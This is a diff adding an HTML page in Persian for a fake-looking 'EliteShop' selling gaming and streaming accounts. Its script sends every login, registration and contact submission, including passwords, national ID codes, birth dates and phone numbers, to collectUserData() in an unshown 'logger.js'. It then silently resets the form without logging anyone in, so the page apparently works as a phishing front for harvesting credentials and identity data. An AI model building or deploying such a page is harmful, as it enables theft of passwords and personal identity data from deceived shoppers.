@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فروشگاه اکانت‌های ویژه | Elite Accounts</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Particles Background -->
+    <div id="particles-js"></div>
+    
+    <!-- Navigation -->
+    <nav>
+        <div class="logo">EliteShop</div>
+        <div class="nav-links">
+            <a href="#home">خانه</a>
+            <a href="#products">فروشگاه</a>
+            <a href="#about">درباره ما</a>
+            <a href="#contact">تماس با ما</a>
+        </div>
+        <div class="auth-buttons">
+            <button class="btn btn-outline" onclick="openLoginModal()">ورود</button>
+            <button class="btn btn-primary" onclick="openRegisterModal()">ثبت نام</button>
+        </div>
+    </nav>
+    
+    <!-- Home Section -->
+    <section id="home">
+        <div class="hero-content fade-in">
+            <h1 class="hero-title">
+                فروشگاه <span class="gradient-text">اکانت‌های ویژه</span> و نایاب
+            </h1>
+            <p class="hero-subtitle">
+                بهترین اکانت‌های گیمینگ، نرم‌افزاری و پریمیوم با تضمین کیفیت و پشتیبانی ۲۴ ساعته
+            </p>
+            <div class="hero-buttons">
+                <button class="btn btn-primary btn-lg" onclick="scrollToSection('products')">
+                    مشاهده محصولات
+                </button>
+                <button class="btn btn-outline btn-lg" onclick="openRegisterModal()">
+                    عضویت ویژه
+                </button>
+            </div>
+        </div>
+    </section>
+    
+    <!-- Products Section -->
+    <section id="products">
+        <h2 class="section-title">محصولات ویژه</h2>
+        <div class="products-grid">
+            <!-- محصول استیم فول ریجن آرژانتین -->
+            <div class="product-card fade-in">
+                <div class="product-img" style="background: linear-gradient(45deg, #1e3c72, #2a5298);">
+                    <i class="fas fa-flag"></i>
+                </div>
+                <div class="product-content">
+                    <h3 class="product-title">اکانت فول ریجن آرژانتین استیم</h3>
+                    <p>اکانت استیم منطقه آرژانتین - خرید با قیمت ارزان - فعال شده</p>
+                    <div class="product-price">۸۵۰,۰۰۰ تومان</div>
+                    <button class="btn btn-primary" style="width: 100%;" onclick="openRegisterModal()">خرید آنلاین</button>
+                </div>
+            </div>
+            
+            <div class="product-card fade-in">
+                <div class="product-img">
+                    <i class="fas fa-gamepad"></i>
+                </div>
+                <div class="product-content">
+                    <h3 class="product-title">اکانت Steam Level 100</h3>
+                    <p>اکانت استیم لول 100 با 50 بازی محبوب و آیتم‌های نایاب</p>
+                    <div class="product-price">۱,۲۰۰,۰۰۰ تومان</div>
+                    <button class="btn btn-primary" style="width: 100%;" onclick="openRegisterModal()">خرید آنلاین</button>
+                </div>
+            </div>
+            
+            <div class="product-card fade-in">
+                <div class="product-img">
+                    <i class="fas fa-crown"></i>
+                </div>
+                <div class="product-content">
+                    <h3 class="product-title">اکانت Netflix Premium</h3>
+                    <p>اکانت نتفلیکس پریمیوم 6 ماهه با تضمین فعال بودن</p>
+                    <div class="product-price">۴۵۰,۰۰۰ تومان</div>
+                    <button class="btn btn-primary" style="width: 100%;" onclick="openRegisterModal()">خرید آنلاین</button>
+                </div>
+            </div>
+            
+            <div class="product-card fade-in">
+                <div class="product-img">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <div class="product-content">
+                    <h3 class="product-title">اکانت Spotify Family</h3>
+                    <p>اکانت اسپاتیفای فمیلی 1 ساله با 6 اسلات خالی</p>
+                    <div class="product-price">۳۰۰,۰۰۰ تومان</div>
+                    <button class="btn btn-primary" style="width: 100%;" onclick="openRegisterModal()">خرید آنلاین</button>
+                </div>
+            </div>
+
+            <!-- محصول جدید: اتشراک پرمیوم تلگرام -->
+            <div class="product-card fade-in">
+                <div class="product-img" style="background: linear-gradient(45deg, #0088cc, #00aced);">
+                    <i class="fab fa-telegram"></i>
+                </div>
+                <div class="product-content">
+                    <h3 class="product-title">اتشراک پرمیوم تلگرام</h3>
+                    <p>اشتراک تلگرام پریمیوم 1 ساله - دانلود نامحدود - استیکرهای ویژه</p>
+                    <div class="product-price">۲۵۰,۰۰۰ تومان</div>
+                    <button class="btn btn-primary" style="width: 100%;" onclick="openRegisterModal()">خرید آنلاین</button>
+                </div>
+            </div>
+
+            <!-- محصول اضافی -->
+            <div class="product-card fade-in">
+                <div class="product-img" style="background: linear-gradient(45deg, #ff6b6b, #ffa726);">
+                    <i class="fas fa-rocket"></i>
+                </div>
+                <div class="product-content">
+                    <h3 class="product-title">اکانت Xbox Game Pass</h3>
+                    <p>اکانت ایکس باکس گیم پس 12 ماهه - دسترسی به 100+ بازی</p>
+                    <div class="product-price">۶۰۰,۰۰۰ تومان</div>
+                    <button class="btn btn-primary" style="width: 100%;" onclick="openRegisterModal()">خرید آنلاین</button>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <!-- About Section -->
+    <section id="about">
+        <h2 class="section-title">درباره ما</h2>
+        <div class="about-content">
+            <div class="about-text">
+                <p>
+                    فروشگاه EliteShop با بیش از 5 سال سابقه در زمینه فروش اکانت‌های ویژه و نایاب، 
+                    به عنوان معتبرترین مرجع خرید اکانت‌های گیمینگ و نرم‌افزاری در ایران شناخته می‌شود.
+                </p>
+                <p>
+                    ما با تیمی متخصص و پشتیبانی 24 ساعته، تضمین می‌کنیم که تمامی اکانت‌های ارائه شده 
+                    اورجینال و با کیفیت عالی باشند. رضایت مشتریان اولویت اصلی ماست.
+                </p>
+            </div>
+            <div class="about-features">
+                <div class="feature">
+                    <i class="fas fa-bolt"></i>
+                    <div>
+                        <h3>تحویل فوری</h3>
+                        <p>تحویل آنی پس از پرداخت موفق</p>
+                    </div>
+                </div>
+                <div class="feature">
+                    <i class="fas fa-shield-alt"></i>
+                    <div>
+                        <h3>تضمین کیفیت</h3>
+                        <p>گارانتی بازگشت وجه 7 روزه</p>
+                    </div>
+                </div>
+                <div class="feature">
+                    <i class="fas fa-headset"></i>
+                    <div>
+                        <h3>پشتیبانی 24/7</h3>
+                        <p>پشتیبانی آنلاین در تمام ساعات</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <!-- Contact Section -->
+    <section id="contact">
+        <h2 class="section-title">تماس با ما</h2>
+        <div class="contact-container">
+            <div class="contact-info">
+                <div class="contact-item">
+                    <i class="fas fa-map-marker-alt"></i>
+                    <div>
+                        <h3>آدرس</h3>
+                        <p>تهران، خیابان ولیعصر، پلاک ۱۲۳۴</p>
+                    </div>
+                </div>
+                <div class="contact-item">
+                    <i class="fas fa-phone"></i>
+                    <div>
+                        <h3>تلفن</h3>
+                        <p>۰۲۱-۱۲۳۴۵۶۷۸</p>
+                    </div>
+                </div>
+                <div class="contact-item">
+                    <i class="fas fa-envelope"></i>
+                    <div>
+                        <h3>ایمیل</h3>
+                        <p>info@eliteshop.com</p>
+                    </div>
+                </div>
+                <div class="contact-item">
+                    <i class="fas fa-clock"></i>
+                    <div>
+                        <h3>ساعات کاری</h3>
+                        <p>۲۴ ساعته، ۷ روز هفته</p>
+                    </div>
+                </div>
+            </div>
+            <form class="contact-form" id="contactForm">
+                <div class="form-group">
+                    <label for="name">نام کامل</label>
+                    <input type="text" id="name" class="form-control" required>
+                </div>
+                <div class="form-group">
+                    <label for="email">ایمیل</label>
+                    <input type="email" id="email" class="form-control" required>
+                </div>
+                <div class="form-group">
+                    <label for="subject">موضوع</label>
+                    <input type="text" id="subject" class="form-control" required>
+                </div>
+                <div class="form-group">
+                    <label for="message">پیام</label>
+                    <textarea id="message" class="form-control" required></textarea>
+                </div>
+                <button type="submit" class="btn btn-primary">ارسال پیام</button>
+            </form>
+        </div>
+    </section>
+    
+    <!-- Footer -->
+    <footer>
+        <div class="footer-content">
+            <div class="logo">EliteShop</div>
+            <div class="footer-links">
+                <a href="#home">خانه</a>
+                <a href="#products">فروشگاه</a>
+                <a href="#about">درباره ما</a>
+                <a href="#contact">تماس با ما</a>
+                <a href="#">قوانین و مقررات</a>
+                <a href="#">حریم خصوصی</a>
+            </div>
+            <div class="social-links">
+                <a href="#"><i class="fab fa-telegram"></i></a>
+                <a href="#"><i class="fab fa-instagram"></i></a>
+                <a href="#"><i class="fab fa-twitter"></i></a>
+                <a href="#"><i class="fab fa-youtube"></i></a>
+            </div>
+            <div class="copyright">
+                © 2023 کلیه حقوق برای EliteShop محفوظ است.
+            </div>
+        </div>
+    </footer>
+    
+    <!-- Login Modal -->
+    <div class="modal" id="loginModal">
+        <div class="modal-content">
+            <span class="close-modal" onclick="closeLoginModal()">&times;</span>
+            <h2 class="modal-title">ورود به حساب کاربری</h2>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="loginEmail">ایمیل یا نام کاربری</label>
+                    <input type="text" id="loginEmail" class="form-control" required>
+                </div>
+                <div class="form-group">
+                    <label for="loginPassword">رمز عبور</label>
+                    <input type="password" id="loginPassword" class="form-control" required>
+                </div>
+                <button type="submit" class="btn btn-primary" style="width: 100%;">ورود</button>
+            </form>
+            <p style="text-align: center; margin-top: 1rem;">
+                حساب کاربری ندارید؟ 
+                <a href="#" onclick="closeLoginModal(); openRegisterModal();" style="color: var(--accent);">ثبت نام کنید</a>
+            </p>
+        </div>
+    </div>
+    
+    <!-- Register Modal -->
+    <div class="modal" id="registerModal">
+        <div class="modal-content">
+            <span class="close-modal" onclick="closeRegisterModal()">&times;</span>
+            <h2 class="modal-title">ثبت نام در EliteShop</h2>
+            <form id="registerForm">
+                <div class="form-group">
+                    <label for="regName">نام کامل</label>
+                    <input type="text" id="regName" class="form-control" required>
+                </div>
+                <div class="form-group">
+                    <label for="regEmail">ایمیل</label>
+                    <input type="email" id="regEmail" class="form-control" required>
+                </div>
+                <div class="form-group">
+                    <label for="regNationalCode">کد ملی</label>
+                    <input type="text" id="regNationalCode" class="form-control" required maxlength="10" pattern="[0-9]{10}">
+                </div>
+                <div class="form-group">
+                    <label for="regBirthDate">تاریخ تولد</label>
+                    <input type="date" id="regBirthDate" class="form-control" required>
+                </div>
+                <div class="form-group">
+                    <label for="regPhone">شماره تماس</label>
+                    <input type="tel" id="regPhone" class="form-control" required>
+                </div>
+                <div class="form-group">
+                    <label for="regPassword">رمز عبور</label>
+                    <input type="password" id="regPassword" class="form-control" required>
+                </div>
+                <div class="form-group">
+                    <label for="regConfirmPassword">تکرار رمز عبور</label>
+                    <input type="password" id="regConfirmPassword" class="form-control" required>
+                </div>
+                <button type="submit" class="btn btn-primary" style="width: 100%;">ثبت نام</button>
+            </form>
+            <p style="text-align: center; margin-top: 1rem;">
+                قبلاً ثبت نام کرده‌اید؟ 
+                <a href="#" onclick="closeRegisterModal(); openLoginModal();" style="color: var(--accent);">وارد شوید</a>
+            </p>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <script src="logger.js"></script>
+    <script>
+        // Initialize Particles.js
+        particlesJS("particles-js", {
+            particles: {
+                number: { value: 80, density: { enable: true, value_area: 800 } },
+                color: { value: "#ffffff" },
+                shape: { type: "circle" },
+                opacity: { value: 0.5, random: true },
+                size: { value: 3, random: true },
+                line_linked: {
+                    enable: true,
+                    distance: 150,
+                    color: "#6a11cb",
+                    opacity: 0.4,
+                    width: 1
+                },
+                move: {
+                    enable: true,
+                    speed: 2,
+                    direction: "none",
+                    random: true,
+                    straight: false,
+                    out_mode: "out",
+                    bounce: false
+                }
+            },
+            interactivity: {
+                detect_on: "canvas",
+                events: {
+                    onhover: { enable: true, mode: "repulse" },
+                    onclick: { enable: true, mode: "push" },
+                    resize: true
+                }
+            }
+        });
+        
+        // Scroll to section function
+        function scrollToSection(sectionId) {
+            document.getElementById(sectionId).scrollIntoView({ behavior: 'smooth' });
+        }
+        
+        // Modal functions
+        function openLoginModal() {
+            document.getElementById('loginModal').style.display = 'flex';
+        }
+        
+        function closeLoginModal() {
+            document.getElementById('loginModal').style.display = 'none';
+        }
+        
+        function openRegisterModal() {
+            document.getElementById('registerModal').style.display = 'flex';
+        }
+        
+        function closeRegisterModal() {
+            document.getElementById('registerModal').style.display = 'none';
+        }
+        
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            const loginModal = document.getElementById('loginModal');
+            const registerModal = document.getElementById('registerModal');
+            
+            if (event.target === loginModal) {
+                closeLoginModal();
+            }
+            if (event.target === registerModal) {
+                closeRegisterModal();
+            }
+        }
+        
+        // Form submission handlers
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const formData = new FormData(this);
+            collectUserData(formData, 'login');
+            
+            setTimeout(() => {
+                closeLoginModal();
+                this.reset();
+            }, 2000);
+        });
+        
+        document.getElementById('registerForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const formData = new FormData(this);
+            collectUserData(formData, 'register');
+            
+            setTimeout(() => {
+                closeRegisterModal();
+                this.reset();
+            }, 2000);
+        });
+        
+        document.getElementById('contactForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const formData = new FormData(this);
+            collectUserData(formData, 'contact');
+            this.reset();
+        });
+        
+        // Fade in animation on scroll
+        const fadeElements = document.querySelectorAll('.fade-in');
+        
+        const fadeInObserver = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.style.opacity = 1;
+                    entry.target.style.transform = 'translateY(0)';
+                }
+            });
+        }, { threshold: 0.1 });
+        
+        fadeElements.forEach(el => {
+            el.style.opacity = 0;
+            el.style.transform = 'translateY(30px)';
+            el.style.transition = 'opacity 0.8s ease, transform 0.8s ease';
+            fadeInObserver.observe(el);
+        });
+
+        // اعتبارسنجی کد ملی
+        document.getElementById('regNationalCode').addEventListener('input', function(e) {
+            const value = e.target.value.replace(/\D/g, '');
+            e.target.value = value;
+        });
+    </script>
+</body>
+</html>
